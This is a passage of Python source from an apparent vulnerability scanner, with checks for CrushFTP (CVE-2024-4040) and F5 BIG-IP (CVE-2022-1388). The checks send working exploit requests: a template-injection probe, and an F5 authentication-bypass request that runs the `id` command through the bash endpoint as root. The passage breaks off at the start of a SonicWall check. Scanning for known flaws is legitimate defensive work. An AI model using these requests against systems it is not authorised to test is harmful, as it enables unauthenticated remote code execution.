def scan_zd_crushftp_ssti(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, hdrs, b, _ = _req(_join_url(base, "/WebInterface/Login.html"))
    if c not in (200, 302):
        c, hdrs, b, _ = _req(base, use_cache=True)
    text = b.decode("utf-8", "ignore")
    if "crushftp" not in text.lower():
        return out
    ver_m = re.search(r"CrushFTP\s*v?(\d+)", text, re.I)
    probe_url = (_join_url(base, "/WebInterface/UserInterface/") +
                 "?command=zip&ZipPath=%3C%25%3D7*7%25%3E&type=file")
    c2, _, b2, _ = _req(probe_url)
    text2 = b2.decode("utf-8", "ignore")
    if c2 == 200 and "49" in text2 and "crushftp" not in text2.lower():
        out.append(("[CONFIRMED] CrushFTP SSTI - template expression 7*7=49 evaluated "
                    "(CVE-2024-4040 CVSS 9.8)", "probe: ZipPath FreeMarker injection"))
        return out
    if ver_m:
        ver = ver_m.group(1)
        try:
            if int(ver) < 11:
                out.append(("[CONFIRMED] CrushFTP v" + ver +
                            " in vulnerable range for CVE-2024-4040 (SSTI / VFS escape CVSS 9.8)",
                            "version: " + ver))
                return out
        except Exception:
            pass
    out.append(("CrushFTP server detected "
                "(CVE-2024-4040 SSTI / VFS escape CVSS 9.8): verify patched to v11.1.0+", base))
    return out

def scan_zd_f5_bigip_icontrol(base: str) -> ScanFindings:
    out: ScanFindings = []
    host = urllib.parse.urlparse(base).hostname or ""
    if not host:
        return out
    is_bigip = False
    mgmt_base = base
    for path in ("/tmui/login.jsp", "/mgmt/shared/authn/login", "/"):
        c, hdrs, b, _ = _req(_join_url(base, path), use_cache=(path == "/"))
        text = b.decode("utf-8", "ignore")
        server = hdrs.get("server", "").lower()
        if ("big-ip" in text.lower() or "bigip" in text.lower() or
                "f5 networks" in text.lower() or "tmui" in text.lower() or
                "big-ip" in server or "f5" in server):
            is_bigip = True
            break
    if not is_bigip:
        mgmt_base_alt = re.sub(r":\d+", "", base.rstrip("/")) + ":8443"
        for path in ("/tmui/login.jsp", "/mgmt/shared/authn/login"):
            c, hdrs, b, _ = _req(mgmt_base_alt + path)
            text = b.decode("utf-8", "ignore")
            if ("big-ip" in text.lower() or "bigip" in text.lower() or
                    "tmui" in text.lower() or "f5 networks" in text.lower()):
                is_bigip = True
                mgmt_base = mgmt_base_alt
                break
    if not is_bigip:
        return out

    bigip_ver = ""
    c_ver, _, b_ver, _ = _req(
        _join_url(mgmt_base, "/mgmt/tm/sys/version"),
        headers={
            "Authorization": "Basic YWRtaW46",
            "Connection":    "keep-alive, X-F5-Auth-Token",
            "X-F5-Auth-Token": "",
            "X-Forwarded-For": "127.0.0.1",
        },
    )
    if c_ver == 200 and b_ver:
        text_ver = b_ver.decode("utf-8", "ignore")
        ver_m = re.search(r'"Value"\s*:\s*"([0-9.]+)"', text_ver) or \
                re.search(r'BIG-IP[/\s]+([0-9.]+)', text_ver, re.I)
        if ver_m:
            bigip_ver = ver_m.group(1)
        if "kind" in text_ver.lower() and "sys" in text_ver.lower():
            out.append(("[CONFIRMED] F5 BIG-IP iControl REST auth bypass: unauthenticated /mgmt/tm/sys/version access "
                        "(CVE-2022-1388 CVSS 9.8)" + (" - version " + bigip_ver if bigip_ver else ""),
                        "endpoint: /mgmt/tm/sys/version"))

    bash_url = _join_url(mgmt_base, "/mgmt/tm/util/bash")
    bash_body = b'{"command":"run","utilCmdArgs":"-c \\"id\\""}'
    try:
        c_rce, _, b_rce, _ = _req(
            bash_url,
            method="POST",
            data=bash_body,
            content_type="application/json",
            headers={
                "Authorization":   "Basic YWRtaW46",
                "Connection":      "keep-alive, X-F5-Auth-Token",
                "X-F5-Auth-Token": "",
                "X-Forwarded-For": "127.0.0.1",
            },
        )
        text_rce = b_rce.decode("utf-8", "ignore")
        if c_rce == 200 and re.search(r"uid=\d+\(", text_rce):
            uid_m = re.search(r"uid=\d+\([^)]+\)", text_rce)
            uid_str = uid_m.group(0) if uid_m else "uid confirmed"
            out.append(("[CONFIRMED] F5 BIG-IP RCE as root - bash `id` executed without credentials "
                        "(CVE-2022-1388 CVSS 9.8): " + uid_str,
                        "endpoint: /mgmt/tm/util/bash"))
            return out
    except Exception:
        pass

    if bigip_ver and not out:
        try:
            p = [int(x) for x in bigip_ver.split(".")[:3]]
            while len(p) < 3:
                p.append(0)
            vuln = ((p[0] == 16 and (p[1] < 1 or (p[1] == 1 and p[2] < 3))) or
                    (p[0] == 15 and (p[1] < 1 or (p[1] == 1 and p[2] < 6))) or
                    (p[0] == 14 and (p[1] < 1 or (p[1] == 1 and p[2] < 5))) or
                    (p[0] == 13 and p[1] < 2) or
                    p[0] in (11, 12))
            if vuln:
                out.append(("[CONFIRMED] F5 BIG-IP version " + bigip_ver +
                            " in vulnerable range for CVE-2022-1388 (iControl REST RCE CVSS 9.8)",
                            "version: " + bigip_ver))
                return out
        except Exception:
            pass
        if not out:
            out.append(("F5 BIG-IP version " + bigip_ver +
                        " detected (CVE-2022-1388 iControl REST RCE CVSS 9.8): "
                        "verify patched to 16.1.2.2+ / 15.1.5.1+ / 14.1.4.6+ / 13.1.5+",
                        "version: " + bigip_ver))
    elif not out:
        out.append(("F5 BIG-IP management interface detected "
                    "(CVE-2022-1388 iControl REST auth bypass -> RCE CVSS 9.8): verify patch level", mgmt_base))
    return out

def scan_zd_sonicwall_sma(base: str) -> ScanFindings:
    out: ScanFindings = []
